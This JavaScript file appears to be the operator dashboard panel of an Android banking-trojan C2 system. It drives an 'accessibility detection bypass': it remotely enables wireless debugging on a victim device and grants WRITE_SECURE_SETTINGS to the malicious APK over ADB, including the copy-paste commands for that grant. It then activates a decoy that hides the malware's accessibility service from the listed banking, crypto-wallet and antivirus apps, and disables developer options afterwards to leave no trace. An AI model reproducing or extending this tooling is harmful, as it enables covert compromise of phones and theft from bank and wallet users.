'use strict';
/**
 * BypassPanel — Accessibility Detection Bypass
 *
 * Handles the full 4-step exploit flow from the dashboard:
 *   Step 1 → Send BYPASS_ENABLE_DEV to device (enables wireless debugging)
 *   Step 2 → ADB pair + connect + grant on server side
 *   Step 3 → Confirm grant landed on device → AccessibilityDecoy activates
 *   Step 4 → (optional) clean: disable developer options
 *
 * Rendered inside pane-bypass. Requires bypass.css vars already in dash.css.
 * Called from dash.js switchPane('bypass') and from device detail actions.
 */

window.BypassPanel = (() => {

  let _devId   = null;
  let _session = null;  // {ip, adb_port, pair_port, status}
  let _pollTimer = null;

  // ── Public API ──────────────────────────────────────────────────────────────

  function open(devId) {
    _devId = devId;
    switchPane('bypass');
    render();
    loadSession();
  }

  function onWsMessage(msg) {
    if (msg.type === 'bypass_status' && msg.dev_id === _devId) {
      updateStepFromDevice(msg);
    }
    if (msg.type === 'bypass_update' && msg.dev_id === _devId) {
      loadSession();
      refreshStatus();
    }
  }

  // ── Main render ─────────────────────────────────────────────────────────────

  function render() {
    const pane = document.getElementById('pane-bypass');
    if (!pane) return;
    const dev  = (window.S?.devices || {})[_devId] || {};
    const name = window.deviceName ? window.deviceName(_devId) : _devId?.slice(0,8);

    pane.innerHTML = `
    <div style="flex:1;overflow:auto;padding:20px;display:flex;flex-direction:column;gap:16px;max-width:760px">

      <!-- Header -->
      <div style="display:flex;align-items:center;gap:12px;margin-bottom:4px">
        <button class="btn btn-ghost btn-sm" onclick="switchPane('devices')">← Back</button>
        <div>
          <div style="font-size:15px;font-weight:600">Accessibility Detection Bypass</div>
          <div style="font-size:11px;color:var(--text-2)">Target: <span style="color:var(--accent)">${esc(name)}</span></div>
        </div>
        <div style="margin-left:auto">
          <span id="bp-decoy-badge" style="display:none;background:rgba(61,186,122,0.15);color:var(--green);font-size:11px;padding:3px 10px;border-radius:20px;border:1px solid rgba(61,186,122,0.3)">
            ✓ Bypass Active
          </span>
        </div>
      </div>

      <!-- How it works -->
      <div class="card" style="padding:12px 14px;border-left:3px solid var(--accent)">
        <div style="font-size:11px;color:var(--text-1);line-height:1.7">
          <strong style="color:var(--text-0)">Exploit chain:</strong>
          Enable Developer Options + Wireless Debugging on the target →
          C2 server connects via ADB over WiFi →
          Grants <code style="color:var(--accent)">WRITE_SECURE_SETTINGS</code> to the APK →
          APK intercepts banking app foreground events and swaps our accessibility service
          entry for a system decoy. Banking app scans see nothing suspicious.
          Developer Options are disabled afterwards — device looks clean.
        </div>
      </div>

      <!-- Step indicators -->
      <div style="display:flex;gap:0;margin-bottom:4px" id="bp-steps-row">
        ${stepBadge(1,'Enable Dev','bp-s1')}
        ${stepArrow()}
        ${stepBadge(2,'ADB Grant','bp-s2')}
        ${stepArrow()}
        ${stepBadge(3,'Verify','bp-s3')}
        ${stepArrow()}
        ${stepBadge(4,'Clean','bp-s4')}
      </div>

      <!-- Step 1 panel -->
      <div class="card" id="bp-step1">
        <div class="card-header"><span class="ch-icon">1️⃣</span><span class="ch-title">Enable Wireless Debugging on Device</span></div>
        <div style="padding:14px;display:flex;flex-direction:column;gap:10px">
          <div style="font-size:12px;color:var(--text-1)">
            Sends <code>BYPASS_ENABLE_DEV</code> to the device. The APK enables Developer Options and
            Wireless Debugging, then reports back the IP address and ADB port for this device.
          </div>
          <div style="display:flex;gap:8px;align-items:center">
            <button class="btn btn-primary" id="bp-btn-step1" onclick="BypassPanel._step1()">
              🚀 Enable Wireless Debugging
            </button>
            <span id="bp-step1-status" style="font-size:11px;color:var(--text-2)"></span>
          </div>
          <!-- ADB info returned from device -->
          <div id="bp-adb-info" style="display:none;background:var(--bg-0);border:1px solid var(--border);border-radius:6px;padding:12px;font-family:var(--font-mono);font-size:11px;line-height:1.9">
            <div>IP: <span id="bpi-ip" style="color:var(--green)"></span></div>
            <div>ADB Port: <span id="bpi-adb" style="color:var(--green)"></span></div>
            <div id="bpi-pair-row" style="display:none">Pairing Port: <span id="bpi-pair" style="color:var(--yellow)"></span></div>
            <div id="bpi-pair-code-row" style="display:none;margin-top:4px">
              Pairing Code:
              <input id="bpi-code" class="form-input" style="width:100px;display:inline-block;margin-left:6px;font-family:var(--font-mono)" placeholder="6-digit code" maxlength="6">
              <span style="font-size:10px;color:var(--text-2);margin-left:6px">
                (Check device: Settings → Developer Options → Wireless Debugging → Pair device with code)
              </span>
            </div>
          </div>
        </div>
      </div>

      <!-- Step 2 panel -->
      <div class="card" id="bp-step2" style="opacity:0.5;pointer-events:none">
        <div class="card-header"><span class="ch-icon">2️⃣</span><span class="ch-title">Execute ADB Grant</span></div>
        <div style="padding:14px;display:flex;flex-direction:column;gap:10px">
          <div style="font-size:12px;color:var(--text-1)">
            The C2 server connects to the device over WiFi and runs:<br>
            <code style="color:var(--accent)">adb shell pm grant com.seguranca.protecao android.permission.WRITE_SECURE_SETTINGS</code>
          </div>
          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-primary" id="bp-btn-step2" onclick="BypassPanel._step2()">
              ⚡ Execute Grant
            </button>
            <button class="btn btn-ghost btn-sm" onclick="BypassPanel._step2manual()">
              📋 Copy Manual Commands
            </button>
          </div>
          <div id="bp-step2-out" style="display:none;background:var(--bg-0);border:1px solid var(--border);border-radius:6px;padding:10px;font-size:11px;font-family:var(--font-mono);white-space:pre-wrap;max-height:140px;overflow:auto;color:var(--text-1)"></div>
        </div>
      </div>

      <!-- Step 3 panel -->
      <div class="card" id="bp-step3" style="opacity:0.5;pointer-events:none">
        <div class="card-header"><span class="ch-icon">3️⃣</span><span class="ch-title">Verify &amp; Activate Bypass</span></div>
        <div style="padding:14px;display:flex;flex-direction:column;gap:10px">
          <div style="font-size:12px;color:var(--text-1)">
            Confirms the permission landed on the device and activates
            <strong>AccessibilityDecoy</strong>. From this point, all banking apps,
            digital wallets, and security apps will see no suspicious accessibility service.
          </div>
          <div id="bp-verify-status" style="display:none" class="card" style="padding:10px 14px">
            <div style="display:flex;gap:10px;align-items:center">
              <div id="bp-vs-dot" class="dot"></div>
              <div>
                <div id="bp-vs-title" style="font-size:12px;font-weight:600"></div>
                <div id="bp-vs-sub" style="font-size:10px;color:var(--text-2);margin-top:2px"></div>
              </div>
            </div>
          </div>
          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-success" id="bp-btn-step3" onclick="BypassPanel._step3()">
              ✅ Confirm &amp; Activate
            </button>
          </div>
          <div id="bp-live-status" style="display:none;font-size:11px;border:1px solid var(--border);border-radius:6px;padding:10px 14px;line-height:2">
            <div>Decoy active: <span id="bpl-active" style="font-weight:600"></span></div>
            <div>Evasions performed: <span id="bpl-count" style="color:var(--green);font-weight:600">0</span></div>
            <div>Last evaded: <span id="bpl-pkg" style="color:var(--text-1)">—</span></div>
          </div>
        </div>
      </div>

      <!-- Step 4 panel -->
      <div class="card" id="bp-step4" style="opacity:0.5;pointer-events:none">
        <div class="card-header"><span class="ch-icon">4️⃣</span><span class="ch-title">Clean Up (Optional)</span></div>
        <div style="padding:14px;display:flex;flex-direction:column;gap:10px">
          <div style="font-size:12px;color:var(--text-1)">
            Disables Developer Options and Wireless Debugging on the device.
            The bypass <strong>remains active</strong> — the WRITE_SECURE_SETTINGS grant
            persists across reboots. The device no longer shows any trace of ADB activity.
          </div>
          <div>
            <button class="btn btn-warning" id="bp-btn-step4" onclick="BypassPanel._step4()">
              🧹 Disable Dev Options &amp; Disconnect ADB
            </button>
          </div>
          <div id="bp-step4-out" style="display:none;font-size:11px;color:var(--green)"></div>
        </div>
      </div>

      <!-- Protected app list -->
      <div class="card">
        <div class="card-header"><span class="ch-icon">🛡</span><span class="ch-title">Protected App Coverage</span></div>
        <div style="padding:10px 14px">
          <div style="display:flex;flex-wrap:wrap;gap:6px">
            ${PROTECTED_APPS.map(a =>
              `<span style="background:var(--bg-2);border:1px solid var(--border);border-radius:4px;padding:2px 8px;font-size:10px;font-family:var(--font-mono)">${a}</span>`
            ).join('')}
          </div>
        </div>
      </div>

    </div>`;

    // Listen for device bypass messages
    document.removeEventListener('nx:bypass', _onBypassEvent);
    document.addEventListener('nx:bypass', _onBypassEvent);
  }

  // ── Step 1: enable wireless debugging ───────────────────────────────────────

  function _step1() {
    setStepStatus(1, 'sending…');
    disable('bp-btn-step1');
    sendWS({ type: 'cmd', target: _devId, cmd: 'BYPASS_ENABLE_DEV', args: {} });
    // Status update comes back via WS bypass_status message
  }

  function _onBypassEvent(e) {
    const { status, data } = e.detail || {};
    if (!status) return;

    if (status === 'PAIR_READY' || status === 'ENABLING_WIRELESS') {
      // Device sent us pairing info
      _session = data;
      showAdbInfo(data);
      setStepDone(1);
      enableStep(2);
    }
    if (status === 'FAILED') {
      setStepError(1, data?.error || 'Failed');
    }
    if (status === 'GRANT_CONFIRMED' || status === 'BYPASSED') {
      setStepDone(3);
      enableStep(4);
      showLiveStatus();
    }
    if (status === 'CLEANED') {
      setStepDone(4);
    }
  }

  function showAdbInfo(data) {
    const box = document.getElementById('bp-adb-info');
    if (!box) return;
    set('bpi-ip',  data.ip  || '—');
    set('bpi-adb', data.adb_port || '—');
    if (data.pair_port && data.need_pair) {
      show('bpi-pair-row');  set('bpi-pair', data.pair_port);
      show('bpi-pair-code-row');
    }
    show('bp-adb-info');
    _session = { ...(_session || {}), ...data };
  }

  // ── Step 2: ADB grant ────────────────────────────────────────────────────────

  async function _step2() {
    if (!_session?.ip) return toast('No device info yet — complete Step 1 first', 'error');
    setStepStatus(2, 'executing…');
    disable('bp-btn-step2');

    const pairingCode = document.getElementById('bpi-code')?.value?.trim() || null;

    try {
      const body = {
        ip:           _session.ip,
        adb_port:     _session.adb_port || 5555,
        pair_port:    _session.pair_port,
        pairing_code: pairingCode,
      };
      const r = await api(`/api/bypass/${_devId}/execute-all`, 'POST', body);
      const out = (r.steps || []).map(s => `[${s.step}] ${s.ok ? '✓' : '✗'} ${s.out || ''}`).join('\n');
      showOut('bp-step2-out', out);

      if (r.ok && r.verified) {
        setStepDone(2);
        enableStep(3);
        setStepStatus(3, 'verification sent to device…');
        // BYPASS_CONFIRM_GRANT already sent by server; wait for WS reply
      } else {
        setStepError(2, 'Grant failed — check ADB output');
        enable('bp-btn-step2');
      }
    } catch (e) {
      setStepError(2, e.message);
      enable('bp-btn-step2');
    }
  }

  function _step2manual() {
    if (!_session?.ip) return toast('No session yet', 'error');
    const ip  = _session.ip;
    const ap  = _session.adb_port || 5555;
    const pp  = _session.pair_port;
    const PKG = 'com.seguranca.protecao';
    const PRM = 'android.permission.WRITE_SECURE_SETTINGS';
    const cmds = [
      pp ? `adb pair ${ip}:${pp} <PAIRING_CODE>` : null,
      `adb connect ${ip}:${ap}`,
      `adb -s ${ip}:${ap} shell pm grant ${PKG} ${PRM}`,
    ].filter(Boolean).join('\n');
    navigator.clipboard.writeText(cmds).then(() => toast('Commands copied to clipboard', 'success'));
  }

  // ── Step 3: verify ───────────────────────────────────────────────────────────

  async function _step3() {
    setStepStatus(3, 'polling device…');
    disable('bp-btn-step3');
    try {
      // Ask device for bypass status
      sendWS({ type: 'cmd', target: _devId, cmd: 'BYPASS_STATUS', args: {} });
      // Start polling for live status
      startStatusPoll();
    } catch (e) {
      setStepError(3, e.message);
    }
  }

  function showLiveStatus() {
    const box = document.getElementById('bp-live-status');
    if (box) show('bp-live-status');
    show('bp-decoy-badge');
    startStatusPoll();
  }

  function startStatusPoll() {
    clearInterval(_pollTimer);
    _pollTimer = setInterval(() => {
      if (_devId) sendWS({ type: 'cmd', target: _devId, cmd: 'BYPASS_STATUS', args: {} });
    }, 8000);
  }

  // ── Step 4: clean ─────────────────────────────────────────────────────────

  async function _step4() {
    if (!_session?.ip) return toast('No session info', 'error');
    disable('bp-btn-step4');
    setStepStatus(4, 'cleaning…');
    try {
      const r = await api(`/api/bypass/${_devId}/clean`, 'POST', {
        ip: _session.ip, adb_port: _session.adb_port || 5555
      });
      showOut('bp-step4-out', r.ok ? '✓ Developer options disabled. Bypass remains active.' : 'Partial clean.');
      if (r.ok) setStepDone(4);
    } catch (e) {
      setStepError(4, e.message);
    }
  }

  // ── Session load ─────────────────────────────────────────────────────────────

  async function loadSession() {
    if (!_devId) return;
    try {
      const row = await api(`/api/bypass/${_devId}/session`);
      if (!row) return;
      _session = row;
      if (['paired','connected','granted','cleaned'].includes(row.status)) {
        showAdbInfo(row);
        setStepDone(1);
        enableStep(2);
      }
      if (['granted','cleaned'].includes(row.status)) {
        setStepDone(2);
        setStepDone(3);
        enableStep(3);
        enableStep(4);
        showLiveStatus();
      }
      if (row.status === 'cleaned') setStepDone(4);
    } catch {}
  }

  async function refreshStatus() {
    const liveActive = document.getElementById('bpl-active');
    if (!liveActive) return;
    try {
      sendWS({ type: 'cmd', target: _devId, cmd: 'BYPASS_STATUS', args: {} });
    } catch {}
  }

  // ── DOM helpers ──────────────────────────────────────────────────────────────

  function stepBadge(n, label, id) {
    return `<div style="display:flex;flex-direction:column;align-items:center;gap:4px;flex:1">
      <div id="${id}" style="width:28px;height:28px;border-radius:50%;background:var(--bg-2);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--text-2)">${n}</div>
      <div style="font-size:9px;color:var(--text-3);text-transform:uppercase;letter-spacing:0.08em">${label}</div>
    </div>`;
  }
  function stepArrow() {
    return `<div style="flex-shrink:0;color:var(--text-3);font-size:14px;padding-top:6px">›</div>`;
  }

  function setStepDone(n) {
    const el = document.getElementById(`bp-s${n}`);
    if (el) { el.style.background='var(--green)'; el.style.borderColor='var(--green)'; el.style.color='#fff'; el.textContent='✓'; }
    setStepStatus(n, '');
  }
  function setStepError(n, msg) {
    const el = document.getElementById(`bp-s${n}`);
    if (el) { el.style.background='var(--red)'; el.style.borderColor='var(--red)'; el.style.color='#fff'; el.textContent='✗'; }
    setStepStatus(n, msg);
  }
  function setStepStatus(n, msg) {
    const el = document.getElementById(`bp-step${n}-status`);
    if (el) el.textContent = msg;
  }
  function enableStep(n) {
    const panel = document.getElementById(`bp-step${n}`);
    if (panel) { panel.style.opacity='1'; panel.style.pointerEvents=''; }
  }
  function showOut(id, text) {
    const el = document.getElementById(id);
    if (el) { el.textContent = text; el.style.display = ''; }
  }
  function show(id) { const e = document.getElementById(id); if (e) e.style.display=''; }
  function set(id, val) { const e = document.getElementById(id); if (e) e.textContent = val; }
  function disable(id) { const e = document.getElementById(id); if (e) e.disabled = true; }
  function enable(id)  { const e = document.getElementById(id); if (e) e.disabled = false; }
  const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');

  // ── Protected app list (display) ────────────────────────────────────────────

  const PROTECTED_APPS = [
    'Nubank','Itaú','Bradesco','Santander','Banco do Brasil','Caixa Tem',
    'C6 Bank','Banco Inter','PicPay','Mercado Pago','BTG Pactual',
    'PayPal','Venmo','Cash App','Binance','Coinbase','MetaMask',
    'Trust Wallet','Phantom','Ledger Live',
    'Chase','Wells Fargo','Bank of America','Citi','HSBC','Barclays',
    'Google Pay','Samsung Pay',
    'Avast','Kaspersky','ESET','Malwarebytes','Lookout',
    '+ all banking/wallet/antivirus apps',
  ];

  return {
    open, onWsMessage, render,
    _step1, _step2, _step2manual, _step3, _step4,
    _onBypassEvent,
    updateLiveStats(data) {
      set('bpl-active', data.decoy_active ? '✅ Yes' : '❌ No');
      set('bpl-count',  data.evade_count  || 0);
      set('bpl-pkg',    data.last_evaded_pkg || '—');
    }
  };
})();
